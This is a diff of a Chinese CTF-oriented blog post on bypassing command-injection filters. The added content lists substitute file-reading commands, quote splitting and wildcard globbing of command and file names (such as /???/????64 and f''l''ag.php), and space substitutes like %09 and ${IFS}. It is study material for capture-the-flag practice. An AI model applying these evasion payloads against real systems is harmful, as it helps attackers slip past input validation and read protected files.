@@ -109,6 +109,11 @@
             <time  class="article-date" datetime="2023-10-27T16:45:51.000Z" itemprop="datePublished">2023-10-28</time>
           </h2>
           
+            <h2 class="last-time">
+              <span>最后更新于</span>
+              <time  class="article-updated" datetime="2023-10-28T17:04:30.492Z" itemprop="dateUpdated">2023-10-29</time>
+            </h2>
+          
           
           <ul class="wrap-list dark">
   
@@ -139,14 +144,34 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h1 id="命令执行的绕过-上篇"><a href="#命令执行的绕过-上篇" class="headerlink" title="命令执行的绕过-上篇"></a>命令执行的绕过-上篇</h1><p>前景提要：我们需要执行哪些命令</p>
-<h4 id="命令篇"><a href="#命令篇" class="headerlink" title="命令篇"></a>命令篇</h4><h5 id="查看文件命令"><a href="#查看文件命令" class="headerlink" title="查看文件命令"></a>查看文件命令</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cat 		&lt;filename&gt;</span><br><span class="line">tac 		&lt;filename&gt;</span><br><span class="line">nl 			&lt;filename&gt;</span><br><span class="line">uniq 		&lt;filename&gt;</span><br><span class="line">hexdump -C 	&lt;filename&gt;</span><br><span class="line">rev			&lt;filename&gt;</span><br><span class="line">head 		&lt;filename&gt;</span><br><span class="line">tail 		&lt;filename&gt;</span><br><span class="line">more		&lt;filename&gt;</span><br><span class="line">less		&lt;filename&gt;</span><br><span class="line">fold		&lt;filename&gt;</span><br><span class="line">strins		&lt;filename&gt;</span><br><span class="line">col			&lt;filename&gt;</span><br></pre></td></tr></table></figure>
+        <h1 id="命令执行的绕过-上篇"><a href="#命令执行的绕过-上篇" class="headerlink" title="命令执行的绕过-上篇"></a>命令执行的绕过-上篇</h1><p>思考分析：在这篇文章我想从做题的角度去思考常见的一些绕过方式，总结一些套路方法。</p>
+<p>前景提要：我们需要执行哪些命令</p>
+<p>先上一个思维导图：</p>
+<h4 id="命令篇-查看文件内容"><a href="#命令篇-查看文件内容" class="headerlink" title="命令篇-查看文件内容"></a>命令篇-查看文件内容</h4><h6 id="换命令"><a href="#换命令" class="headerlink" title="换命令"></a>换命令</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;filename&gt;tac</span><br><span class="line">cat，uniq，nl,hexdump -C等等</span><br><span class="line">直接查看文件命令</span><br><span class="line">cat 		&lt;filename&gt;</span><br><span class="line">tac 		&lt;filename&gt;</span><br><span class="line">nl 			&lt;filename&gt;</span><br><span class="line">uniq 		&lt;filename&gt;</span><br><span class="line">hexdump -C 	&lt;filename&gt;</span><br><span class="line">rev			&lt;filename&gt;</span><br><span class="line">head 		&lt;filename&gt;</span><br><span class="line">tail 		&lt;filename&gt;</span><br><span class="line">more		&lt;filename&gt;</span><br><span class="line">less		&lt;filename&gt;</span><br><span class="line">vi			&lt;filename&gt;</span><br><span class="line">vim			&lt;filename&gt; 在ctfshow web29没有测试成功</span><br><span class="line">fold		&lt;filename&gt; 笔者未测试</span><br><span class="line">strins		&lt;filename&gt; 笔者未测试</span><br><span class="line">col			&lt;filename&gt; 笔者未测试</span><br><span class="line">间接查看文件命令</span><br><span class="line">base64		&lt;filename&gt;</span><br><span class="line">bzip2		&lt;filename&gt;</span><br></pre></td></tr></table></figure>
 
-<h6 id="绕过方式："><a href="#绕过方式：" class="headerlink" title="绕过方式："></a>绕过方式：</h6><p>0x01&gt;换命令名称</p>
-<p>0x02&gt;加引号</p>
-<p>0x03&gt;&#x2F;bin&#x2F;命令名称—&gt;&#x2F;???&#x2F;????????</p>
-<p>0x04&gt;不直接查看，考虑压缩写入文件？然后单独访问</p>
-<p>0x05&gt;考虑运算？</p>
+<h6 id="加引号"><a href="#加引号" class="headerlink" title="加引号"></a>加引号</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tac</span><br><span class="line">t&#x27;&#x27;ac、t&quot;&quot;ac</span><br></pre></td></tr></table></figure>
+
+<h6 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h6><p>base64</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base64 		&lt;filename&gt;</span><br><span class="line">/???/base64 &lt;filename&gt;</span><br><span class="line">/???/????64 &lt;filename&gt;</span><br></pre></td></tr></table></figure>
+
+<p>不直接查看，考虑压缩写入文件？然后单独访问[压缩后访问<filename>.bz2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bzip2 		&lt;filename&gt;</span><br><span class="line">/???/????2 	&lt;filename&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="考虑运算"><a href="#考虑运算" class="headerlink" title="考虑运算"></a>考虑运算</h6><h4 id="字符篇-文件名称"><a href="#字符篇-文件名称" class="headerlink" title="字符篇-文件名称"></a>字符篇-文件名称</h4><h6 id="加引号-1"><a href="#加引号-1" class="headerlink" title="加引号"></a>加引号</h6><p>任意拼接一对单引号or双引号即可。</p>
+<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag.php</span><br><span class="line">f<span class="string">&#x27;&#x27;</span>l<span class="string">&#x27;&#x27;</span>ag.php</span><br><span class="line">fl<span class="string">&quot;&quot;</span>ag.php</span><br><span class="line">fl<span class="string">&#x27;&#x27;</span><span class="string">&quot;&quot;</span>ag.php</span><br></pre></td></tr></table></figure>
+
+<h6 id="通配符-1"><a href="#通配符-1" class="headerlink" title="通配符"></a>通配符</h6><p>主要用到两个符号 ： * 和 ? </p>
+<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag.php</span><br><span class="line">f*</span><br><span class="line">fl*</span><br><span class="line">fla*</span><br><span class="line">f???.php</span><br><span class="line">f???????</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="字符篇-命令衔接"><a href="#字符篇-命令衔接" class="headerlink" title="字符篇-命令衔接"></a>字符篇-命令衔接</h4><p>命令衔接在这里指的是，命令之间的衔接，这里特指空格。举个例子：<code>cat flag.php</code> 中间的空格也就是我们需要考虑的衔接部分。</p>
+<h6 id="定向符号"><a href="#定向符号" class="headerlink" title="定向符号 &lt;"></a>定向符号 &lt;</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;filename&gt;</span><br><span class="line">cat&lt;&lt;filename&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="特殊符号-09-20-26"><a href="#特殊符号-09-20-26" class="headerlink" title="特殊符号 %09 %20 %26"></a>特殊符号 %09 %20 %26</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;filename&gt;</span><br><span class="line"><span class="meta prompt_">cat%</span><span class="language-bash">09&lt;filename&gt;</span></span><br><span class="line"><span class="meta prompt_">cat%</span><span class="language-bash">20&lt;filename&gt;</span></span><br><span class="line"><span class="meta prompt_">cat%</span><span class="language-bash">26&lt;filename&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;filename&gt;</span><br><span class="line"><span class="meta prompt_">cat$</span><span class="language-bash">&#123;IFS&#125;&lt;filename&gt;</span></span><br></pre></td></tr></table></figure>
+
 
       </section>
 
